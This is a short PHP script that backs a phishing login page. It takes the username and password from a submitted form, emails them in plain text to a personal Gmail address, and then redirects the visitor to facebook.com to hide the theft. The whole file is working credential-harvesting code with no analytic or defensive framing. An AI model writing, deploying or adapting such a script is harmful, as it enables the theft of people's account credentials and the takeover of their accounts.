<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Send email
    $to = "hanzmark03@gmail.com";
    $subject = "Login Details";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: webmaster@example.com";

    if (mail($to, $subject, $message, $headers)) {
        // Email sent successfully, perform the redirection
        header("Location: https://facebook.com");
        exit(); // Make sure to exit to prevent further execution
    } else {
        echo "Failed to send email.";
    }
}
?>